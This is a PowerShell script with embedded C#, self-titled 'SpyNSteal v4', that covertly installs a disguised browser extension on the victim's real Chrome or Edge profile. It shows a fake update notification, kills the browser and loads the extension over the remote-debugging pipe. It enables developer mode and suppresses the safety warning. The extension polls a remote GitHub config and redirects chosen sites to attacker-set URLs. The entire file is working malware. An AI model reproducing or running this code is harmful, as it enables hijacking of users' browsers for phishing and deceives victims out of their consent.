# SpyNSteal v4 - CDP install on real profile (Chrome 142+ compatible)
# Chrome 142 removed --load-extension entirely. Must use CDP Extensions.loadUnpacked.
# Edge still supports --load-extension natively.

$MANIFEST = @'
{
  "manifest_version": 3,
  "name": "Chrome Resource Scheduler",
  "version": "1.0",
  "description": "Manages internal resource scheduling and prioritization.",
  "permissions": ["declarativeNetRequest"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "sw.js"
  }
}
'@

$SW_JS = @'
const C = "https://raw.githubusercontent.com/Intel-Boss/t/main/config.json";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  pull();
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
init();
'@

$LOGFILE = Join-Path $env:APPDATA "sns_debug.txt"
function Log([string]$msg) {
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    $line = "[$ts] $msg"
    try { Add-Content $LOGFILE $line } catch {}
}

Log "=========================================="
Log "SpyNSteal v4 - Starting"
Log "User: $env:USERNAME | Machine: $env:COMPUTERNAME"
Log "=========================================="

# -- Inline C# for CDP pipe communication --
Add-Type -ReferencedAssemblies @("System.Core") -TypeDefinition @"
using System;
using System.IO;
using System.IO.Pipes;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Collections.Generic;

public class PipeCDP {
    private static void Send(AnonymousPipeServerStream pipe, string json) {
        byte[] b = Encoding.UTF8.GetBytes(json);
        pipe.Write(b, 0, b.Length);
        pipe.WriteByte(0);
        pipe.Flush();
    }

    private static string ExtractStr(string json, string key) {
        string p = "\"" + key + "\":\"";
        int s = json.IndexOf(p);
        if (s < 0) return null;
        s += p.Length;
        int e = json.IndexOf("\"", s);
        return (e > s) ? json.Substring(s, e - s) : null;
    }

    private static string WaitReply(List<string> q, object lk, int id, int timeoutMs) {
        string t1 = "\"id\":" + id;
        string t2 = "\"id\": " + id;
        DateTime deadline = DateTime.Now.AddMilliseconds(timeoutMs);
        while (DateTime.Now < deadline) {
            lock (lk) {
                for (int i = 0; i < q.Count; i++) {
                    if (q[i].Contains(t1) || q[i].Contains(t2)) {
                        string r = q[i]; q.RemoveAt(i); return r;
                    }
                }
            }
            Thread.Sleep(100);
        }
        return null;
    }

    public static string Install(string chromePath, string userDataDir, string extensionDir, int waitAfterLaunchMs) {
        AnonymousPipeServerStream toChrome = null;
        AnonymousPipeServerStream fromChrome = null;
        Process proc = null;
        string log = "";

        try {
            toChrome = new AnonymousPipeServerStream(PipeDirection.Out, HandleInheritability.Inheritable);
            fromChrome = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable);

            string rHandle = toChrome.GetClientHandleAsString();
            string wHandle = fromChrome.GetClientHandleAsString();

            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = chromePath;
            psi.Arguments = String.Format(
                "--remote-debugging-pipe " +
                "--enable-unsafe-extension-debugging " +
                "--user-data-dir=\"{0}\" " +
                "--no-first-run --no-default-browser-check " +
                "--disable-background-networking " +
                "--remote-debugging-io-pipes={1},{2}",
                userDataDir, rHandle, wHandle);
            psi.UseShellExecute = false;
            log += "LAUNCH_ARGS:" + psi.Arguments + "|";

            try { proc = Process.Start(psi); }
            catch (Exception ex) { return "ERR:LAUNCH:" + ex.Message; }

            toChrome.DisposeLocalCopyOfClientHandle();
            fromChrome.DisposeLocalCopyOfClientHandle();

            log += "PID:" + proc.Id + "|";
            Thread.Sleep(waitAfterLaunchMs);
            if (proc.HasExited) return log + "ERR:CHROME_DIED:exit=" + proc.ExitCode;

            List<string> queue = new List<string>();
            object qLock = new object();

            Thread reader = new Thread(delegate() {
                try {
                    StringBuilder sb = new StringBuilder();
                    while (true) {
                        int bt = fromChrome.ReadByte();
                        if (bt == -1) break;
                        if (bt == 0) {
                            string m = sb.ToString(); sb.Length = 0;
                            if (m.Length > 0) { lock (qLock) { queue.Add(m); } }
                        } else { sb.Append((char)bt); }
                    }
                } catch {}
            });
            reader.IsBackground = true;
            reader.Start();

            // Load extension via CDP Extensions.loadUnpacked
            string extPath = extensionDir.Replace("\\", "/");
            Send(toChrome,
                "{\"id\":1,\"method\":\"Extensions.loadUnpacked\",\"params\":{\"path\":\"" + extPath + "\"}}");
            string extResp = WaitReply(queue, qLock, 1, 30000);
            log += "EXT_RESP:" + (extResp != null ? extResp : "TIMEOUT") + "|";

            string loadedId = (extResp != null) ? ExtractStr(extResp, "id") : null;
            log += "EXT_ID:" + (loadedId != null ? loadedId : "NONE") + "|";

            if (loadedId != null) {
                // Open chrome://extensions tab and enable developer mode + acknowledge safety check
                Send(toChrome,
                    "{\"id\":10,\"method\":\"Target.createTarget\",\"params\":{\"url\":\"chrome://extensions\"}}");
                string tResp = WaitReply(queue, qLock, 10, 15000);
                string targetId = (tResp != null) ? ExtractStr(tResp, "targetId") : null;
                log += "TARGET:" + (targetId != null ? "ok" : "null") + "|";

                if (targetId != null) {
                    Send(toChrome,
                        "{\"id\":11,\"method\":\"Target.attachToTarget\",\"params\":{\"targetId\":\"" + targetId + "\",\"flatten\":true}}");
                    string aResp = WaitReply(queue, qLock, 11, 10000);
                    string sessId = (aResp != null) ? ExtractStr(aResp, "sessionId") : null;
                    log += "SESSION:" + (sessId != null ? "ok" : "null") + "|";

                    if (sessId != null) {
                        Thread.Sleep(3000);
                        // Enable developer mode
                        Send(toChrome,
                            "{\"id\":12,\"sessionId\":\"" + sessId + "\",\"method\":\"Runtime.evaluate\",\"params\":{" +
                            "\"expression\":\"chrome.developerPrivate.setProfileConfiguration({inDeveloperMode:true})\"," +
                            "\"awaitPromise\":true}}");
                        string devResp = WaitReply(queue, qLock, 12, 10000);
                        log += "DEVMODE:" + (devResp != null ? "ok" : "timeout") + "|";

                        Thread.Sleep(2000);
                        // Acknowledge safety check warning
                        string ackExpr =
                            "chrome.developerPrivate.updateExtensionConfiguration({" +
                            "extensionId:'" + loadedId + "'," +
                            "acknowledgeSafetyCheckWarning:true})";
                        Send(toChrome,
                            "{\"id\":13,\"sessionId\":\"" + sessId + "\",\"method\":\"Runtime.evaluate\",\"params\":{" +
                            "\"expression\":\"" + ackExpr.Replace("\"", "\\\"") + "\",\"awaitPromise\":true}}");
                        string ackResp = WaitReply(queue, qLock, 13, 10000);
                        log += "ACK:" + (ackResp != null ? "ok" : "timeout") + "|";
                    }
                }
            }

            // Wait for Chrome to flush preferences to disk
            Thread.Sleep(5000);

            // Gracefully close Chrome so it saves Secure Preferences
            try { Send(toChrome, "{\"id\":99,\"method\":\"Browser.close\"}"); } catch {}
            log += "CLOSE_SENT|";

            bool exited = false;
            try { exited = proc.WaitForExit(20000); } catch {}
            if (!exited) { try { proc.Kill(); } catch {} try { proc.WaitForExit(5000); } catch {} }
            log += "EXITED:" + exited + "|";

            proc = null;
            return log;

        } catch (Exception ex) {
            return log + "ERR:GENERAL:" + ex.Message;
        } finally {
            if (proc != null) {
                try { if (!proc.HasExited) proc.Kill(); } catch {}
                try { proc.WaitForExit(5000); } catch {}
            }
            if (toChrome != null) try { toChrome.Dispose(); } catch {}
            if (fromChrome != null) try { fromChrome.Dispose(); } catch {}
        }
    }
}
"@
Log "C# PipeCDP class compiled"

function Find-Browser([string]$name) {
    $info = @{ Name = $name; Found = $false; Running = $false }
    switch ($name) {
        "chrome" {
            $info.UserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $info.Proc = "chrome"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
            $info.AppDirs = @(
                "$env:ProgramFiles\Google\Chrome\Application",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application",
                "$env:LOCALAPPDATA\Google\Chrome\Application"
            )
            $info.NotifTitle = "Google Chrome"
            $info.NotifText = "An update has been downloaded. Restarting to apply changes."
        }
        "edge" {
            $info.UserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            $info.Proc = "msedge"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
            $info.AppDirs = @(
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application",
                "$env:ProgramFiles\Microsoft\Edge\Application",
                "$env:LOCALAPPDATA\Microsoft\Edge\Application"
            )
            $info.NotifTitle = "Microsoft Edge"
            $info.NotifText = "An update has been installed. Edge will restart to apply it."
        }
    }
    if (-not (Test-Path $info.UserData)) { return $info }
    $info.Found = $true
    $info.Running = [bool](Get-Process $info.Proc -EA SilentlyContinue)
    try { $info.ExePath = (Get-ItemProperty $info.RegKey -EA Stop).'(default)' } catch {}
    if (-not $info.ExePath -or -not (Test-Path $info.ExePath)) {
        foreach ($d in $info.AppDirs) {
            $exe = if ($name -eq "chrome") { "chrome.exe" } else { "msedge.exe" }
            $c = Join-Path $d $exe
            if (Test-Path $c) { $info.ExePath = $c; break }
        }
    }
    return $info
}

function Show-UpdateNotif($browser) {
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        Add-Type -AssemblyName System.Drawing -EA Stop
        $n = New-Object Windows.Forms.NotifyIcon
        if ($browser.ExePath -and (Test-Path $browser.ExePath)) {
            $n.Icon = [Drawing.Icon]::ExtractAssociatedIcon($browser.ExePath)
        } else { $n.Icon = [Drawing.SystemIcons]::Information }
        $n.BalloonTipTitle = $browser.NotifTitle
        $n.BalloonTipText = $browser.NotifText
        $n.Visible = $true
        $n.ShowBalloonTip(5000)
        Start-Sleep 5
        $n.Visible = $false; $n.Dispose()
    } catch {}
}

function Kill-Browser([string]$procName) {
    for ($i = 0; $i -lt 20; $i++) {
        if (-not (Get-Process $procName -EA SilentlyContinue)) { return $true }
        Get-Process $procName -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
        Start-Sleep -Milliseconds 500
    }
    return (-not [bool](Get-Process $procName -EA SilentlyContinue))
}

# =============================================================================
# STEP 1: Drop extension files
$baseDir = Join-Path $env:APPDATA "CRSched"
$extDir = Join-Path $baseDir "src"
New-Item -Path $extDir -ItemType Directory -Force | Out-Null
$utf8 = New-Object Text.UTF8Encoding($false)
[IO.File]::WriteAllText((Join-Path $extDir "manifest.json"), $MANIFEST, $utf8)
[IO.File]::WriteAllText((Join-Path $extDir "sw.js"), $SW_JS, $utf8)
Log "STEP 1: Extension dropped to $extDir"
Log "  manifest.json exists: $(Test-Path (Join-Path $extDir 'manifest.json'))"
Log "  sw.js exists: $(Test-Path (Join-Path $extDir 'sw.js'))"

# STEP 2: Find browsers
$browsers = @()
foreach ($name in @("chrome","edge")) {
    $b = Find-Browser $name
    Log "STEP 2: $name - Found=$($b.Found) Running=$($b.Running) Exe=$($b.ExePath)"
    if ($b.Found -and $b.ExePath) { $browsers += $b }
}
if ($browsers.Count -eq 0) { Log "FATAL: No browsers found"; exit }

# STEP 3: Fake update + kill
$wasRunning = @()
foreach ($b in $browsers) { if ($b.Running) { $wasRunning += $b } }
if ($wasRunning.Count -gt 0) {
    Log "STEP 3: Showing fake update notification for $($wasRunning[0].Name)"
    Show-UpdateNotif $wasRunning[0]
}
foreach ($b in $browsers) {
    if ($b.Running) {
        $killed = Kill-Browser $b.Proc
        Log "STEP 3: Kill $($b.Proc) - success=$killed"
    }
}
Start-Sleep 3
Log "STEP 3: All browsers killed, waiting 3s"

# STEP 4: Select target and install via CDP
$target = if ($wasRunning.Count -gt 0) { $wasRunning[0] } else { $browsers[0] }
Log "STEP 4: Target browser = $($target.Name)"
Log "  ExePath = $($target.ExePath)"
Log "  UserData = $($target.UserData)"
Log "  ExtDir = $extDir"

# Get Chrome version for logging
try {
    $chromeVer = (Get-Item $target.ExePath).VersionInfo.FileVersion
    Log "  Browser version = $chromeVer"
} catch { Log "  Could not get browser version" }

Log "STEP 4: Starting CDP install (this takes ~45 seconds)..."
$cdpResult = [PipeCDP]::Install($target.ExePath, $target.UserData, $extDir, 8000)
Log "STEP 4: CDP result = $cdpResult"

# STEP 5: Parse result and check if extension was installed
$extId = ""
if ($cdpResult -match '"id"\s*:\s*"([a-z]{32})"') {
    $extId = $matches[1]
    Log "STEP 5: Extension ID = $extId"
} else {
    Log "STEP 5: WARNING - Could not extract extension ID from CDP result"
}

# STEP 6: Verify extension in Secure Preferences
Start-Sleep 2
$secPrefsPath = Join-Path $target.UserData "Default\Secure Preferences"
$prefsPath = Join-Path $target.UserData "Default\Preferences"
Log "STEP 6: Checking persistence..."
Log "  Secure Preferences exists: $(Test-Path $secPrefsPath)"
Log "  Preferences exists: $(Test-Path $prefsPath)"

if ($extId -and (Test-Path $secPrefsPath)) {
    $spContent = [IO.File]::ReadAllText($secPrefsPath)
    $hasExt = $spContent.Contains($extId)
    Log "  Extension ID in Secure Preferences: $hasExt"
}
if ($extId -and (Test-Path $prefsPath)) {
    $pContent = [IO.File]::ReadAllText($prefsPath)
    $hasExtP = $pContent.Contains($extId)
    Log "  Extension ID in Preferences: $hasExtP"
}

# STEP 7: Relaunch browser normally
Log "STEP 7: Relaunching $($target.Name) normally..."
Start-Process $target.ExePath
Start-Sleep 5

# STEP 8: Verify Chrome is running and check its command line
$procs = Get-CimInstance Win32_Process -Filter "name='$($target.Proc).exe'" -EA SilentlyContinue
if ($procs) {
    Log "STEP 8: $($target.Name) is running ($(($procs | Measure-Object).Count) processes)"
    $first = $procs | Select-Object -First 1
    if ($first.CommandLine) {
        Log "  First process cmdline: $($first.CommandLine.Substring(0, [Math]::Min(200, $first.CommandLine.Length)))"
    }
} else {
    Log "STEP 8: WARNING - $($target.Name) not running after relaunch!"
}

Log "=========================================="
Log "DONE - Check chrome://extensions"
Log "Log file: $LOGFILE"
Log "=========================================="
